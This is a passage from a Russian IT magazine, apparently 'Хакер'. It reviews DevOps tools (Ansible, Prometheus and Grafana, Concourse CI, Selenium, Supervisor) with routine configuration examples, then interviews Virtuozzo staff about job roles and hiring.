тирование  и  дальнейшее  сопровождение.  Чтобы  укла‐
дываться в сроки и при этом выпускать качественный про‐
дукт, абсолютно все процессы необ ходимо автоматизиро‐
вать и контролировать. И конечно, здесь выручают спе‐
циализированные инструменты. Представ ляем пятерку must
have приложений, без которых сложно обойтись.


ANSIBLE
Задача номер один в любой организа ции — автоматизация развертывания
ПО и приложений, настройка серверов. На сегодня доступно более двадцати
систем управления конфигурацией, из них самые известные — Chef, CFEn‐
gine, Puppet, но Ansible, появившийся позже всех, в 2012 году, пользуется
наибольшей популярностью. Причина — низкий порог входа, мак симальная
простота работы и безопасность. На удален ных системах для управления
не используются агенты, все производится через SSH. Для подключения нас‐
траивается беспарольная аутентифика ция при помощи ключей, так же под‐
держивается LDAP и Kerberos.
  Возможно выполнение на удаленных узлах одиночной команды, скрипта
или любых операций, выполняемых обычно вручную: проверки состояния,
установки, удаления пакетов, создания учетных записей и прав, копиро вания
данных, управления системой, сервисами и многих других. Причем боль‐
шинство функций реализованы с помощью модулей, упрощающих написание
кода, при необходимости можно использовать системные команды нап‐
рямую, хотя это рекомендует ся только для тех случаев, когда это действи‐
тельно необходимо. Список модулей есть на сайте проекта.
  Кроме Linux, работает и под другими ОС, включая и Win. Поддерживаются
Cloud‐сервисы — Amazon,  Azure,  Digital Ocean, сетевое оборудование
некоторых производителей. Есть отсылка сообщений и многое другое.
Задачи могут выпол няться как поочередно на каждом узле, так и син хронно.
  В Ansible для работы используется два файла. Один содержит список хос‐
тов, разбитых по группам (inventory), второй — список задач, которые нужно
выполнить (playbook). Проекты обычно располагаются в отдельных каталогах.
В качестве inventory по умол чанию используется /etc/ansible/hosts, хотя его
можно указать в строке вызова плейбука, поэтому при работе с несколькими
проектами inventory располагают внут ри каталога проекта и указывают имя
в строке запус ка при помощи параметра  ‐i. Группировать узлы можно
как удобно, по назначению или расположению.


[Web]
    192.168.1.1
    192.168.1.2
    db.example.com
[Mail]
    192.168.1.1
    mail.example.com

Есть еще два типа не SSH‐подключения: local и docker. Поддерживаются
группировка групп и переменные, динамическое создание списка узлов
при помощи скрипта. Переменные под ключения позволяют указать нес‐
тандартный порт, специфическую учет ную запись для выполнения команд,
ключ для входа и тому подобное:


db.example.com ansible_port=1234 ansible_host=192.0.0.5 ansible_user=
user

Вся магия скрыта в плейбуках. В playbook используется формат сериали‐
зации данных YAML, который легко читается. Например, установка nginx
при помощи модуля apt в Ubuntu/Debian выглядит так:


‐ name: Install the nginx packages
  apt:
  name: nginx
  state: present
update_cache: yes
  when: ansible_os_family == "Debian"

Оператор when позволяет добавлять в правило любые про верки.
  Задачу быстрого старта упрощает хаб, предоставля ющий готовые поль‐
зовательские решения буквально для всех задач. Достаточно лишь выб рать
подходящий, скопировать вруч ную с GitHub или при помощи ansible‐galaxy,
и база для работы уже есть.


ansible‐galaxy install username.rolename

Каждая роль содержит список задач (task), шаблоны и файлы для копиро‐
вания. Переменные в шаб лонах поз воля ют подставлять разные параметры
внутрь при копировании на узлы. Задачи выполняют ся последовательно, оче‐
редная начинает выполняться после успешного завершения текущей. В слу ‐
чае ошибки на каком‐то узле он исключает ся из списка, на остальных выпол‐
нение продолжается. Это защища ет от частичного выполнения playbook,
но если задача свя занная (например, разверты вание кластера), то отсутству‐
ющий узел делает дальнейшее выполнение бесполезным. Например, про‐
верим доступность всех узлов, описанных в файле inventory.ini, при помощи
модуля ping:


$ ansible all ‐‐inventory‐file=inventory.ini ‐‐module‐name ping

Смотрим список узлов и проверяем синтаксис плейбука:


$ ansible‐playbook ‐i inventory.ini playbook.yml ‐‐list‐hosts
$ ansible‐playbook ‐i inventory.ini playbook.yml ‐‐syntax‐check

Запускаем:


$ ansible‐playbook ‐i inventory.ini playbook.yml

Ansible позволяет полностью реализовать идею Infrastructure as Code и отдать
обычно сложные операции неспециалисту, которому после конфигурирова‐
ния нужно будет выполнить одну коман ду. Хотя тому, кто создает playbook,
все‐таки нужно понимать процессы: уста новка одной‐двух простых ролей
обычно проходит без проблем, но, если ролей уже десяток, нужно запускать
их в правильном порядке. Например, если сервис в кластере использует
GlusterFS, то логично вначале ставить GlusterFS, а потом сервис. К тому же
не всегда best practices применимы к некоторым приложениям. Например,
перезагрузку сервиса рекомендуют делать не напрямую командой, а через
handlers, который перезапускает его, когда логично. Но, например, при раз‐
вертывании мас тер — мастер кластера MariaDB лучше контролировать этот
процесс вручную, поскольку handlers, как назло, перезапускает сервисы
именно в тот момент, когда они синхронизируют ся.
  Документация очень подробная и содержит множество примеров.





       На Galaxy можно найти готовые плейбуки под разные задачи





                  Проверяем доступность узлов


PROMETHEUS + GRAFANA
Без системы мониторинга любое приложение — это черный ящик. Очень
сложно сказать, что там происходит внутри при увеличении нагрузки. Сами
приложения уже давно не монолит ны, части взаимодействуют между собой
по API, а их работу обеспечивает не только LAMP, но и другие сервисы (Elast‐
icsearch, RabbitMQ…). Мет рики позволя ют посмотреть работу компонентов
в динамике и понять, где узкое место.
  Одно из наиболее под ходящих решений сбора метрик и мониторинга
в современной динамической сети — связка Prometheus и Grafana. В Pro‐
metheus исполь зуется децентра лизованная архитектура, позволяющая легко
добавлять сервисы и серверы. На удаленные хосты устанавливаются агенты,
которые при помощи заранее подготовленных установок обнаруживают авто‐
матически запущенные на узле приложения, в том числе знают и про вир‐
туализацию. Это все очень упрощает администрирование. Поддерживается
оповещение и простые графики для визу аль ного представления собранных
данных. В настоящее время доступны агенты для узла (node_exporter),
MySQL, Memcached, HAProxy, Consul, Blackbox, SNMP и другие. Так же Pro‐
metheus может принимать мет рики от клиентов сторонних разработчиков.
Самый  популяр ный —  Telegraf,  под держивающий  около  80  плагинов
для получения метрик с Apache, nginx, Varnish, СУБД, Docker, Kubernetes, log‐
parser и так далее.
  Пакет Prometheus есть в репозитори ях основных дистрибутивов, но там
далеко не последняя версия, поэтому луч ше брать бинарные сборки с сайта
проекта. Все источники данных затем прописываются в /etc/prometheus/pro‐
metheus.yml, в форме:


scrape_configs:
  ‐ job_name: 'node'
static_configs:
  ‐ targets: ['localhost:9090']
labels: {'host': 'prometheus'}

В job_name прописывают ся хосты с одинаковыми настройками, labels поз‐
воляют отбирать затем метрики по дополнительным парамет рам.
  После кон фигурирования проверяем отсутствие ошибок при помощи ути‐
литы promtool.


$ promtool check‐config /etc/prometheus/prometheus.yml

И запускаем пер вый раз в консоли, чтобы видеть вывод:


$ prometheus ‐config.file /etc/prometheus/prometheus.yml

Подключившись браузером на localhost:9090, можем увидеть информацию
о работе Prometheus, просмотреть собранные мет рики в виде данных
или графиков, узнать статус агентов.
  Метрик Prometheus собирает много, а штат ный интерфейс по их визу али‐
зации сильно ограничен. Здесь на помощь приходит Grafana, умеющий
из коробки выводить мет рики, предоставляемые Prometheus, Graphite, In‐
ﬂuxDB, Elasticsearch, AWS и, при помощи плагинов, многими другими. После
выбора источников (Data Sources) настра иваются дашборды. Поддерживает‐
ся несколько вариантов графиков, а встроенный язык запросов позволяет
получать любые данные. Причем на сайте проекта уже есть готовые dash‐
board (в формате JSON), которые легко импортируют ся и при необходимости
редактируются. Для выбора правиль ных мет рик можно воспользоваться
поиском Metric lookup, расположенным правее строки Query. Но главное —
поддерживаются шаблоны (Manage Dashboard → Templating). Так, указав
переменную host (например, $host = label_values(host)), можно затем ее
использовать в метриках вместо имени узла или IP:


cpu_usage_system{host="$host"}

После чего нужный узел надо просто выб рать в дашборде. Доступны алерты
с возможностью отсылать сообщения по электронной почте, HipChat, Slack,
Telegram и некоторых других. Для этого пот ребуется установить критическое
значение метрики, введя значение вручную или перемещая сердечко справа
от графика, и включить метод отправки предупреждений в Alerting → Notif‐
ication List. Но в текущей версии 4.2 алерты не поддерживают дашборды
с шаблонами. Поэтому необ ходимо под них создавать отдельный dashboard
без шаблонов, в котором прописать только те параметры предупреждения,
которые мы хотим получать. Обычно для этого просто копируют готовый гра‐
фик, убирая перемен ные.
  Проект предоставляет исходный код и сбор ки для Linux, Windows, macOS
и контейнер Docker. Для Ubuntu есть готовый пакет и репозиторий, поэтому
установка сложностей не представляет. По умол чанию для сохранения нас‐
троек и данных использует ся SQLite. При большом количестве узлов имеет
смысл использовать MySQL или PostgreSQL.





    Графики Grafana наглядны и позволя ют буквально увидеть проблемы





  Выбор каналов для отсылки алертов в Grafana


CONCOURSE CI
Автоматическая сборка проектов (Continuous Integration) после обновления
кода экономит кучу времени, поскольку дает возможность сразу увидеть
результат — есть ли прогресс и есть ли ошибки. Docker еще больше упростил
задачу: протестировать можно сразу в разных средах. Приложений, позволя ‐
ющих внедрить CI в процесс, сегодня много, но часто они не бесплатны
и достаточно сложны, так что требуют привлечения специалиста. Concourse
CI позволяет реализовать непрерыв ную интеграцию в короткие сроки, он
прост в развертывании и не требует длительного изу чения. Как стро ить Dock‐
er‐образы при изменении кода в Git, можно разоб раться буквально за пару
часов. Также поддерживается интегра ция с AWS S3, отправка уведомлений
по email и HipChat, выполнение команд и многое другое.
  Базируется Concourse CI на трех понятиях: задачи (tasks), ресурсы (re‐
sources) и задания (jobs). Задача в общем случае — это любая команда,
используемая при сборке контейнера. Ресурс — это любой объект, сос‐
тояние и версию которого можно отследить. То есть это именно то, что поз‐
воляет все запускать автоматически. Изначально подразумевается Git, хотя
это может быть и просто таймер. Полный список официальных и неофициаль‐
ных ресурсов доступен на сайте. Задание описыва ет действия, которые будут
запущены при изменении отслеживаемых ресурсов или вручную. Сами дей‐
ствия описываются в плане сборки — тесты, выполнение команд и сборка
контейнера Docker. Для выполнения нужного действия ресурсы и задания
между собой  связываются при помощи  конвейера  (pipelines). Данные
о pipelines и журналы работы сохраняются в PostgreSQL, поэто му всегда мож‐
но сказать, кто что делал.
  Параметры можно задавать как непосредственно в командной строке, так
и в конфигурацион ном файле YAML. На сайте есть множество примеров, поз‐
воляющих разобраться в процессе. Для управления и ручного запуска
заданий используется утилита  Fly, просматривать результаты и запускать
задания также можно через веб‐интерфейс.
  Проект предоставляет бинарники для Linux, macOS и Windows, готовые
образы Docker и Vagrant.





                  Простой pipelines в Concourse CI


ФУНКЦИОНАЛЬНОЕ ТЕСТИРОВАНИЕ
Деплой проекта — это лишь полдела, и без проверки работоспособности
приложения он практически бесполезен. Поэтому любой мало‐мальски дель‐
ный проект включает в себя QA‐тестировщика, выполняющего пакет тестов
и фиксирующего результат. Если при ложение одно, то, наверное, вполне
реально на промежуточных сборках провести некоторые базовые действия
вручную. Если же результатом должен быть десяток образов для самых раз‐
ных конфигураций, то без хотя бы простейшей автоматизации здесь не обой‐
тись. Среди решений для тестирования веб‐приложений особой популяр‐
ностью поль зует ся Selenium, фактически ставший стандартом в этой области.
Основой служит библиотека управления браузерами Selenium (ранее Seleni‐
um WebDriver), состоящая из клиент ских библиотек на разных языках и драй‐
веров браузеров. На сегодня разработа ны драйверы для FF, Chrome, IE, Op‐
era, Safari и ряда мобильных устройств. Они находятся на разных этапах раз‐
работки и, соответственно, требуют разного внимания. Так же проект предос‐
тавляет Selenium IDE в виде расширения к FF, которое позволя ет записывать,
сохранять и воспроизводить сценарии тестирования любых приложе ний,
доступных через браузер. Записанные сценарии сох раня ются в формате
HTML в виде таблицы, которую можно редактировать. Возможен экспорт
в формат, понимаемый другими фреймворками для проведе ния тестов —
NUnit, TestNG, JUnit, хотя, признаться, специалисты ред ко используют сге‐
нерированные тесты в других средах, а все пишут сами.
  Принцип работы прост. После уста новки Selenium IDE ярлык для запуска
находится в меню «Инструменты» (Ctrl + Alt + S). Открываем в браузере сайт
и начинаем запись. Затем последовательно выполняем все нужные действия.
После записи можем запускать сценарий как вручную, так и по расписанию.
Есть возможность устанавливать брейк‐пойнты и регулировать ско рость
выполнения и прочее.
  Для небольших проектов этого вполне достаточно, хотя это не вся авто‐
матизация Selenium. Еще один элемент, разрабатываемый проектом, — Sel‐
enium Server, который позволяет выпол нять в браузере команды, полученные
из сценария, запущен ного с локальной или удаленной машины. Хотя здесь,
конечно, желательно уже познакомиться с фреймворком тестирования Behat,
без которого точно не обойтись. Несколько сер веров Selenium могут обра‐
зовывать распределенную сеть (Selenium Grid), позволя ющую легко масшта‐
бировать стенд автоматизации, запуская параллельно разные тесты на раз‐
ных удаленных машинах, в итоге время тестирова ния сокращается. Плюс
в этом случае — можно запустить Selenium Server с разными парамет рами,
а нужный узел будет выбран для теста автоматически. Основные вопросы
освещены в документации проекта.





  Тестирование в Selenium IDE


SUPERVISOR
На сервере, особен но используемом при разработке, приходится запускать
много всяких программ, установленных не при помощи системно го менед ‐
жера пакетов, которые должны работать постоянно, перезапускаться в случае
ошибки и рестарта сервера. Например, приложения  Node.js, Selenium,
самописные скрипты. В принципе, можно написать init/systemd‐скрипты,
но обычно это требует больше времени, и не всегда получается нужный кон‐
троль. Выходом из ситуации может быть менед жер про цессов Supervisor,
предлагающий простой и надежный способ управления работой таких при‐
ложений. Демон supervisord запускает процессы как дочерние, а поэтому
может отслеживать и при необ ходимости их автоматически перезапускать.
Для мониторинга работы и управления настройками на лету использует ся
консольная утилита supervisorctl и веб‐интерфейс (включается при помощи
inet_http_server). Нужный пакет уже есть в репозиториях дистрибутивов,
поэтому с установкой проб лем не возникнет:


$ sudo apt install supervisor

Конфигурационные файлы располага ются в /etc/supervisor/conf.d, файл дол‐
жен иметь расширение conf. Традиционно настройки каждого сервиса про‐
изводятся в одном файле. Хотя, если нужно запустить несколько копий с раз‐
ными установками, можно для удобства прописывать в одном. Для примера
настроим запуск Selenium через Supervisor.


$ sudo nano /etc/supervisor/conf.d/selenium.conf
[program:selenium]
command=java ‐Dwebdriver.chrome.driver=/usr/local/bin/chromedriver ‐
jar /opt/selenium/selenium‐server‐standalone.jar ‐port %(ENV_SE
LENIUM_PORT)s
priority=10
user=selenium
directory=/home/selenium
environment=HOME="/home/selenium"
autostart=true
autorestart=true

Параметры очевидны. В program:selenium ука зыва ется имя, под которым сер‐
вис будет доступен в supervisorctl. В command указывается стро ка запуска
программы со всеми парамет рами, user — учет ная запись, от имени которой
будет выполнена программа. Далее каталог, в котором она будет запущена
(он дол жен быть создан). Параметры autostart и autorestart определяют запуск
программы при загрузке ОС и перезапуск в слу чае остановки. При true прог‐
рамма после остановки будет переза пускаться всегда, даже если она нор‐
маль но отработает свой цикл. Если перезапуск нужен только в слу чае сбоя,
следует исполь зовать параметр unexpected. В документации можно найти
еще много параметров на самые разные ситуации. Перечитываем кон‐
фигурацию:


$ sudo supervisorctl reread

Если ошибок нет, применя ем настройки:


$ sudo supervisorctl update

Если нужно отключить какой‐то сервис, то луч ше это сделать, используя инте‐
рактивный режим:


$ sudo supervisorctl

Появится приглашение, все команды можно узнать, введя help:


supervisor> help

Перезапустим selenium


supervisor> restart selenium
supervisor> status selenium
supervisor> quit


ВЫВОД
Это то, что нужно обя зательно знать. Но это только верхушка айсберга: Dev‐
Ops за восемь лет оброс многочисленны ми инструментами и технологиями,
а требования к специалисту разные. Поэтому учиться придется постоянно.
SYNACK





                                                                      Денис Колисниченко
                                                                               Постоянный автор журнала
                                                                                               «Хакер»
                                                                                         dhsilabs@gmail.com

       СОТРУДНИКИ VIRTUOZZO О СЕБЕ
   И О ТОМ, ЧЕГО ЖДУТ ОТ КАНДИДАТОВ
РАБОТА
ДЛЯ ЛИНУКСОИДА




Компания  Virtuozzo —  разработчик  гиперконвергентной
платформы, в осно ве которой лежат технологии виртуали‐
зации и хранения данных. Мы поговорили с менед жерами
компании, чтобы узнать, кто и как разрабатывает такие
решения в России, а также рас ска зать читателю о том, что
нужно, чтобы пойти работать в такую фирму.


Как и в любой другой компании, в  Virtuozzo есть несколько отде лов,
или  команд: команда  технической под держки, команда разработчиков,
команда програм‐менеджеров, а также один человек, заменяющий собой
целый отдел, — разработчик ядра Linux. Теоретически ты можешь попытаться
трудоустроиться в любую из этих команд, но обра ти внимание на уровень
сложности.





  Все, кто сидят на стульях под инфразвуковыми излучателями, очень быс‐
  тро становятся фанатами Virtuozzo

Проще всего устроиться на работу в группу технической поддержки. Тебе
достаточно уметь разговаривать на английском, а так же иметь пред став‐
ление о коман дной строке (пусть и в Windows — даже Linux знать необя ‐
зательно) и понимать, как работа ет сеть. Подробнее о работе техподдержки
расскажет Мария Антонова, руководитель группы технической под держки.


МАРИЯ АНТОНОВА, РУКОВОДИТЕЛЬ ГРУППЫ ТЕХНИЧЕСКОЙ
ПОДДЕРЖКИ

     Работа: инже нер техподдер жки
     Уровень сложности: EASY
     Необходимые знания:  раз говор ный  английский,  стрес соус той-
       чивость, толерантность, зна ние Linux и сетей
     Что получишь кроме денег: зна ние Linux и сетей, зна ние Virtuozzo,
      опыт обще ния на английском
     Карьерные возможности: стар ший инже нер техподдер жки, дру гие
      должнос ти в ком пании

Я руковожу группой технической поддержки Virtuozzo. Когда у клиентов воз‐
никают какие‐то проблемы с инстал ляцией или с исполь зованием наших про‐
дуктов, они приходят к нам. Обращения бывают самые разные: от неспешной
настройки или анализа производительности до авралов с лежащим продак ‐
шен‐сервером. И хотя по факту мы фронтлайн — все заявки сразу попадают
в мою коман ду, — по сложности заявок мы вторая линия.
  Каждый новый случай — это небольшое детективное рассле дование.
Люди обращаются с жалоба ми на то, что что‐то не работает, но, чтобы
понять, что случилось, приходится копать глубоко, выискивать узкие места.
Это очень интересно, часто нужно придумывать какие‐то нестандартные спо‐
собы решения проблем.
   Иногда даже сам не замечаешь, как прокачиваются какие‐то фундамен‐
тальные, базовые знания ОС и сетей. Ну и конеч но, приятно решать проб‐
лемы и видеть результат и довольных клиентов. Когда тебе говорят: «Чуваки,
у меня горел проект, а вы все подняли, вы такие крутые», — это отлично
мотивирует.





                    Мария Антонова

Естественно, попадаются и клиенты, реагирующие на произошедшую ситу‐
ацию очень… эмоционально и резко. Начинают писать капсом, обрывать нам
телефоны и нервничать. От этого никуда не деться, с этим нужно уметь справ‐
ляться. Должен быть определенный уровень стрессоустойчивости. Но в
целом мы обычно общаемся с продвинутыми и адек ватными людьми —
айтишниками и сисадминами, которые разбираются в нашем продук те.
   У нас очень много заявок от клиентов, которых мы уже знаем. Обычно
в компании за Virtuozzo‐инфраструктуру отвечают конкретные люди, и они
и приходят к нам в поддержку от имени этой компании. Есть клиенты, которых
мы знаем по именам, видели на фото в социальных сетях. Особенно клиенты,
с которыми приходится сидеть в WebEx, потому что не все дают прямой дос‐
туп к инфраструктуре, с кем‐то проблемы решаем в онлайн‐сессии.
  Бывает, разговоришься и вдруг узнаешь, что кто‐нибудь из зарубежных
клиентов очень хочет приехать в Россию, в какой‐то опре деленный город,
выучить русский язык. То есть общение переходит и на лич ные темы.
   Тем, кто хочет прийти к нам работать, нужно знать английский на уровне
хотя бы intermediate, потому что подав ляющее большинство клиентов —
за рубежом.
  Общаясь с клиентами из разных стран, разных регионов, начинаешь
замечать разницу и подстра иваться. К переписке с клиентами из Германии и,
к примеру, из Вьетнама нужно подходить по‐разному. В Азии своя специфи‐
ка — часто бесполезно писать развернутые подробные рекомендации:
из пяти абзацев будет прочитан только пер вый, а возможно, вооб ще только
первое предложение. Иногда приходится опускать все вежливости и писать
чуть ли не грубо, чтобы преодолеть язы ковой барьер. Разбираться в подоб‐
ных лингвистических нюансах тоже очень интересно.
  Из технических навыков нужно понимание работы сетей. Многие сложные
случаи связаны именно с сетями. Причем нужно не только понимать,
как работает сеть в нашем продукте, но и знать основы — модель OSI, стек
протоколов TCP/IP, что такое VLAN и так далее. Также нужно иметь хотя бы
минимальный опыт работы с Linux.





  Как видишь, серверная больше всего похожа на самую обычную сер‐
  верную. Зато — без пыли, грязи и домовых

На самом деле у меня нет каких‐то четко прописанных требований и списка
навыков. Я смотрю на баланс: на английский, на понимание основ ОС. Если
человек не знает Linux, но работал с командной строкой Windows и имеет
представление о сетях, то ему просто пот ребуется больше времени и больше
сил на освоение новых вещей. Главное — чтобы соображал хорошо.
  Отказать я могу, если пойму, что мне будет невыгодно вкладываться в это‐
го человека, потому что пройдет слишком много времени, прежде чем я нач ну
получать какой‐то реальный «выхлоп». Когда я общаюсь с соискателем, пыта‐
юсь сопоставить его с людьми, которые сейчас работают у меня в коман де,
понять, уживется он с ними или нет. У нас очень спло ченная команда —
по характерам, манере общения, по мировоззрению. Если я понимаю, что
кандидат по характеру, поведению, взглядам не сойдется, не сработается
с ребятами, я вряд ли возьму такого человека.
  В поддержке есть куда расти в смысле карьеры. У нас несколько гра‐
даций — от junior‐инженера можно дорасти до chief‐инже нера. Плюс у нас
сейчас толь ко один technical account manager — человек, который работает
с определенными клиента ми, глубоко погружаясь в их инфраструк туру, раз‐
бирается в бизнес‐планах и проектах, которые они собираются внед рять.
Также мы планируем развивать направление customer success. Туда будут
входить роли technical account manager и, в некотором виде, professional ser‐
vices. Это может быть консультирова ние клиента, помощь в первоначальной
настройке. Плюс наши сотрудники будут писать тренинги, которые мы будем
предлагать клиентам.
  Для оцен ки эффектив ности работы мы исполь зуем набор стандартных
метрик: время, за которое мы найдем решение нетривиальной проблемы (ini‐
tial response time, time to workaround), время на решение для заявок с высоким
приоритетом. Мы стараемся отслеживать общее время, которое уходит
на закрытие тикета. Отслеживаем и общее удовлетворение клиента, и качес‐
тво обслуживания (customer satisfaction rate и quality). Есть внутренние инс‐
трукции, где описано, как поступать в таких‐то случаях, как катего ризировать
заявку и так далее.
   Раз в пару недель я стараюсь встречаться с каждым инженером из моей
команды, чтобы «син хронизоваться» — узнать общий настрой человека,
обсудить  его  успехи/проблемы,  дальнейшее  развитие,  получить/дать
обратную связь.
  Ребятам уровня senior иногда становится неин тересно просто делать
какие‐то тикеты, и я стараюсь вовлекать их в другие проекты. Опять же — тре‐
нинги: пришел новенький, понятно, что нужно его прокачать до определен‐
ного уровня, научить продукту. Ему назнача ется ментор, и инженеру откры‐
вается возможность проявить себя в качестве тренера и наставника.
  Бывают интересные и сложные в техническом плане тикеты. Например,
дол го пытаешься понять, почему у вир туальной машины не работает сеть,
а потом оказывается, что проблема вытекает из определенного кон фликта
обновленной прошивки на Cisco и последнего обновления сетевого драй‐
вера Red Hat. Пока до этого докопа ешься, семь потов сойдет, со всеми
переговоришь и обратишься куда только можно.
   Ну и конечно, в нашей работе происходит масса забавных слу чаев.
Однажды нам пришел тикет — начинаем его читать и понимаем: что‐то не то.
Оказывается, человек написал его в стихах! Что делать, отвечать пришлось
тоже стихами. Потом с клиентом посмеялись, он сказал: «Спасибо, что под‐
держали, прямо можно распечатать и на стенку повесить».
   Как видишь, техподдержка — это совсем не скучно, во всяком случае в Vir‐
tuozzo. Но если ты умеешь программировать на С, знаешь один из скрип‐
товых языков (например, bash) и тебе совсем не хочется общаться с не всег‐
да уравновешенными клиентами, тогда обрати свое внимание на команду
разработчиков Virtuozzo Linux. О том, что пред ставляет собой эта коман да,
расскажет ее лидер — Денис Силаков.
                   ← НАЧАЛО СТАТЬИSYNACK

         СОТРУДНИКИ VIRTUOZZO О СЕБЕ
              И О ТОМ, ЧЕГО ЖДУТ ОТ
                       КАНДИДАТОВ
РАБОТА
  ДЛЯ ЛИНУКСОИДА





ДЕНИС СИЛАКОВ, ЛИДЕР КОМАНДЫ VIRTUOZZO LINUX

     Работа: раз работчик
     Уровень сложности: MEDIUM
     Необходимые знания: прод винутое зна ние Linux, желательно зна -
      ние C/C++ и одного из скрип товых язы ков
     Что получишь кроме денег: еще более прод винутое зна ние Linux,
      опыт раз работки дис трибутива, опыт работы в команде
     Карьерные возможности: senior developer, работа в любой дру гой
      ком пании, связанной с Linux

Я руковожу командой, создающей Virtuozzo Linux. Это наш собственный дис‐
трибутив — практически собственная вет ка CentOS с нужными нам изме‐
нениями, которые используют ся во флагманских продуктах Virtuozzo. Мы
предлагаем Virtuozzo Linux и как отдельный продукт, но его главное примене‐
ние — служить основой для наших флагманских продук тов, то есть Virtuozzo,
OpenVZ и Virtuozzo Storage. Сам Virtuozzo — это ядро и некоторые компонен‐
ты, но для его работы нужны многие вещи из пользовательского пространс‐
тва. Вот это пользовательское пространство как раз и предоставляется Vir‐
tuozzo Linux.





                       Денис Силаков

Наша команда работает над несколь кими большими проектами. Это тес‐
тирование и автоматизация самого разного рода. Разных пакетов много, слу ‐
чаи сложные, и когда мы что‐то берем из CentOS или отку да‐то еще, то хотим
убедиться, что все заработает гладко. У нас есть люди, которые по собствен‐
ной инициативе дописывают какие‐то вещи. И поскольку у нас специфичные
сценарии, мы часто ловим баги, которые не поймал Red Hat. Поэтому обща‐
емся с Red Hat и патчим.
  Человек, который придет к нам в команду, получит массу знаний о Linux
и его устройстве. Как он загружается, как загружаются библиотеки, что такое
systemd, как он устроен, где и какие сервисы стар туют, как устро ена сеть.
В силу специфики всякими графическими шту ками мы не занимаемся, так
что, как пропатчить KDE под Virtuozzo, мы не расскажем. В целом нормальное
такое системное программирова ние — слой, который лежит повыше ядра
и обслуживает всю систему. В любых его компонентах приходит ся копаться.
   У нас есть задачи на разный уровень под готовки и связан ные с разными
частями системы. Что точно придет ся изучить, поверхностно или глубоко, —
это, например, сборку пакетов RHL. Нужны и спецы по безопасности.
Но вообще узких областей, на которые мы бы искали человека для решения
конкретной задачи, у нас нет. Наши сот рудники ориентируются во всей сис‐
теме. Понятно, что вглубь во все сра зу не проникнешь, но надо быть готовым
обучаться на месте. Мне кажется, что если человек нормально разбирается
в Linux, то обычно он готов.
   У нас есть более‐менее формальный трекинг времени через Jira. Но это
не значит, что мы не оставляем времени для лич ных проектов и самораз‐
вития. Дело в том, что один рабочий день у нас равен шести часам. То есть ты
можешь из вось мичасового рабочего дня шесть часов делать полезные дела,
а остальное вре мя потратить по своему усмотрению.
  Задач при этом у нас всегда просто немерено. Решить их все в поставлен‐
ные сроки вряд ли получится. Мы делаем оценки, но все понимают, что эти
оценки — штука довольно гиб кая. Запланировал неделю, повезло, сделал
за два часа. Не повезло — ушел на пару недель или месяц… Собственно,
оценки выставля ются прежде всего с точки зрения менед жеров, чтобы они
могли прикидывать, когда появится продукт, какая там будет функциональ‐
ность и что можно обещать клиентам. Но не чтобы подгонять разработчиков.
Соответственно, задачи мы ранжируем: какие кровь из носу надо сделать, а с
какими можно подождать.
  По критическим задачам у нас, как правило, есть кому подстраховать. Если
вдруг случается такое, что кто‐то надолго выбыва ет, работа над серьезной
задачей не встанет намертво. И если кто‐то заболел или столкнулся на пару
дней с какими‐то незапланированными делами, то проблем с дед лайнами
у него не будет.
   Анализ кода мы дела ем через запросы на включение (pull request. — Прим.
ред.). Для этого используем Git stash и свою утилиту, которая позволяет
отсматривать и комментировать патчи обозримого объема, то есть где‐то
до тысячи строк. Если изменения большие — скажем, это первая выкладка
какого‐то большого компонента, — общение идет либо в Jira, либо просто
по почте.
  Принимая человека на работу, мы в первую очередь, еще до интервью,
смотрим, что он может рассказать о себе и что показать. Как правило, если
человек работает с Linux, то у него есть какие‐то опенсорсные работки,
на которые можно взглянуть, — как минимум патчи на GitHub. А если есть
свои проекты, то это вообще отлично. Мы смотрим, как человек кодит и как
общается. Если есть такой бэкграунд, то потом на собесе довании всегда
интересно поговорить о том, что он делал в других проектах.
   Когда соискателю нечего показать, мы еще до собеседования можем дать
ему тестовое задание. На собеседова нии для этого недостаточно времени,
к тому же человек обычно испытывает стресс. Луч ше пускай посидит дома
с чайком и погрузится в задачу как положено.
  Еще нам важно проверить, насколько человек хорошо ориентирует ся
в Linux — как пользователь или как сисадмин. На собеседовании можем,
к примеру, дать ему написать какой‐нибудь shell‐скриптик и посмотреть,
как он будет бодаться с синтаксисом bash и с командами.
   Когда человек приходит в команду, мы обычно даем ему реализовать
какую‐нибудь небольшую фичу, чтобы он ознакомился с нашим рабочим про‐
цессом и процессом анализа кода. Заодно посмотрит, как мы работаем
с комьюнити, как устроена Jira и так далее. Ну и заодно сделает что‐то
маленькое, приятное и полезное.
   Иногда есть смысл брать людей с целью обу чить или перепрофилировать.
Тут все напрямую зависит от того, чего конкретно не хватает: если общие
знания есть, но нет каких‐то определенных знаний для конкретной задачи, то
есть смысл обучать. А если не хватает умений и навыков — научись. У нас
подождут, помогут.
   Иногда мы берем студентов — за несколько лет до окончания вуза. У них
начиная с треть его курса идет базовая кафедра, в роли которой можно выб‐
рать и Virtuozzo. Чем ближе к выпуску, тем больше времени они проводят
у нас. Если стажер нам нравится и ему нравит ся у нас, то к концу обу чения он
фактически становится нашим работником. К примеру, на физтехе на пятом
курсе ты всего два дня в институте, в остальное время уже работаешь.





    Так офис выглядит при отклю ченной системе виртуальной маскировки





  Да ладно, мы пошутили, на самом деле офис выглядит вот так. В правом
  нижнем углу ты можешь наблюдать торжество беспроводных технологий

Если ни техподдержка, ни разработка тебя не привлекают, ты можешь поп‐
робовать себя на роли програм‐менед жера. Все‐таки руководящая дол‐
жность есть руководящая должность. Об особенностях этой роли расскажет
Андрей Моруга.


АНДРЕЙ МОРУГА, ДИРЕКТОР УПРАВЛЕНИЯ ПРОГРАММАМИ
КОМПАНИИ VIRTUOZZO

     Работа: program manager
     Уровень сложности: HARD
     Необходимые знания:  техничес кий бэк гра унд, опыт управле ния
      и раз решения конфлик тов, опыт в техподдер жке или раз работке, спо-
      собность не терять  точ ку зре ния пользовате ля на продукт, даже
      находясь внутри команды раз работки
     Что получишь кроме денег: еще больше опы та в управле нии, зна -
      комс тво с Linux и рынком вир туальной инфраструк туры, рас ширишь
      свой кру гозор в сов ременных технологиях управле ния вир туализацией
      и приложе ниями
     Карьерные возможности: стар ший менед жмент

Я руковожу несколькими командами в Virtuozzo. Основная часть моих под ‐
чиненных — это програм‐менеджеры, люди, которые определяют, что мы
делаем в продукте, как это будет использоваться, каким клиентам это нужно,
как это будет развиваться. По сути, их работа — это выработка требований,
иногда дизайн каких‐то компонентов проекта, которые имеют отношение
к пользовательским интерфейсам. Также в моем ведении команда техничес‐
ких писателей и команда дизайнеров.





                         Андрей Моруга

Мы, в частности, реша ем, что войдет в следующую версию продук та, получая
